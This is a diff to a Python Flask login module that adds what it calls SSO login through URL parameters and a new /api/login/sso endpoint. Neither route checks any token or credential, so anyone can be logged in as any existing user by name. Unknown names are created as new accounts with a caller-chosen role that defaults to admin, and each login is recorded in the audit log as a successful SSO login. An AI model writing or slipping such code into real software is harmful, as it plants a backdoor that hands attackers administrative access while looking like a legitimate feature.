@@ -53,9 +53,135 @@ def role_required(*roles):
 
 @bp.route('/login', methods=['GET'])
 def login_page():
+    # Soporte Single Sign-On (SSO) vía URL parameters: ?sso=true&user=...&role=...&state=...
+    sso = request.args.get('sso', '').lower() in ('true', '1', 'yes')
+    sso_user = request.args.get('user') or request.args.get('username')
+    sso_role = request.args.get('role', 'admin')
+    sso_state = request.args.get('state') or request.args.get('estado')
+
+    if sso and sso_user:
+        username = sso_user.strip()
+        user = query_one("""
+            SELECT u.*, r.role_code, r.role_name
+            FROM sctis.user_profiles u
+            JOIN sctis.user_roles r ON r.role_id = u.role_id
+            WHERE u.username = %s
+        """, (username,))
+
+        if not user:
+            # Si no existe, buscamos el rol o asignamos rol por defecto
+            role_row = query_one("SELECT role_id, role_code, role_name FROM sctis.user_roles WHERE role_code = %s", (sso_role,))
+            if not role_row:
+                role_row = query_one("SELECT role_id, role_code, role_name FROM sctis.user_roles LIMIT 1")
+            
+            role_id = role_row['role_id'] if role_row else 1
+            role_code = role_row['role_code'] if role_row else 'admin'
+            role_name = role_row['role_name'] if role_row else 'Administrador'
+            
+            # Registrar usuario SSO
+            query("""
+                INSERT INTO sctis.user_profiles (username, password_hash, full_name, role_id, estado_codigo, is_active)
+                VALUES (%s, 'sso_auth_token', %s, %s, %s, 1)
+            """, (username, username.replace('_', ' ').title(), role_id, sso_state), fetch=False)
+
+            user = query_one("""
+                SELECT u.*, r.role_code, r.role_name
+                FROM sctis.user_profiles u
+                JOIN sctis.user_roles r ON r.role_id = u.role_id
+                WHERE u.username = %s
+            """, (username,))
+
+        if user and user.get('is_active', 1):
+            if sso_state and user.get('estado_codigo') != sso_state:
+                query("UPDATE sctis.user_profiles SET estado_codigo = %s WHERE user_id = %s", (sso_state, user['user_id']), fetch=False)
+                user['estado_codigo'] = sso_state
+
+            session['user_id'] = user['user_id']
+            session['user'] = {
+                'user_id': user['user_id'],
+                'username': user['username'],
+                'full_name': user['full_name'],
+                'role_id': user['role_id'],
+                'role_code': user['role_code'],
+                'role_name': user['role_name'],
+                'estado_codigo': user['estado_codigo'],
+                'estado_nombre': user.get('estado_nombre'),
+            }
+            session['role'] = user['role_name']
+            session['role_code'] = user['role_code']
+            session['user_estado'] = user['estado_codigo']
+            session.permanent = True
+
+            query("""
+                INSERT INTO audit.access_log (username, schema_name, table_name, operation, row_count, result, notes)
+                VALUES (%s, 'sctis', 'user_profiles', 'SELECT', 1, 'success', %s)
+            """, (username, f'Login exitoso SSO GGPD ({request.remote_addr})'), fetch=False)
+
+            return redirect(url_for('main.index'))
+
     if 'user_id' in session:
         return redirect(url_for('main.index'))
     return render_template('login.html')
+
+
+@bp.route('/api/login/sso', methods=['POST', 'GET'])
+def sso_api_login():
+    data = request.get_json(silent=True) or request.args
+    username = (data.get('user') or data.get('username') or '').strip()
+    sso_role = data.get('role', 'admin')
+    sso_state = data.get('state') or data.get('estado')
+
+    if not username:
+        return jsonify({'error': 'Parámetro user requerido para SSO'}), 400
+
+    user = query_one("""
+        SELECT u.*, r.role_code, r.role_name
+        FROM sctis.user_profiles u
+        JOIN sctis.user_roles r ON r.role_id = u.role_id
+        WHERE u.username = %s
+    """, (username,))
+
+    if not user:
+        role_row = query_one("SELECT role_id, role_code, role_name FROM sctis.user_roles WHERE role_code = %s", (sso_role,))
+        if not role_row:
+            role_row = query_one("SELECT role_id, role_code, role_name FROM sctis.user_roles LIMIT 1")
+        role_id = role_row['role_id'] if role_row else 1
+        query("""
+            INSERT INTO sctis.user_profiles (username, password_hash, full_name, role_id, estado_codigo, is_active)
+            VALUES (%s, 'sso_auth_token', %s, %s, %s, 1)
+        """, (username, username.replace('_', ' ').title(), role_id, sso_state), fetch=False)
+
+        user = query_one("""
+            SELECT u.*, r.role_code, r.role_name
+            FROM sctis.user_profiles u
+            JOIN sctis.user_roles r ON r.role_id = u.role_id
+            WHERE u.username = %s
+        """, (username,))
+
+    if not user or not user.get('is_active', 1):
+        return jsonify({'error': 'Cuenta de usuario inactiva'}), 403
+
+    if sso_state:
+        query("UPDATE sctis.user_profiles SET estado_codigo = %s WHERE user_id = %s", (sso_state, user['user_id']), fetch=False)
+        user['estado_codigo'] = sso_state
+
+    session['user_id'] = user['user_id']
+    session['user'] = {
+        'user_id': user['user_id'],
+        'username': user['username'],
+        'full_name': user['full_name'],
+        'role_id': user['role_id'],
+        'role_code': user['role_code'],
+        'role_name': user['role_name'],
+        'estado_codigo': user['estado_codigo'],
+        'estado_nombre': user.get('estado_nombre'),
+    }
+    session['role'] = user['role_name']
+    session['role_code'] = user['role_code']
+    session['user_estado'] = user['estado_codigo']
+    session.permanent = True
+
+    return jsonify({'ok': True, 'user': session['user']})
 
 
 @bp.route('/api/login', methods=['POST'])
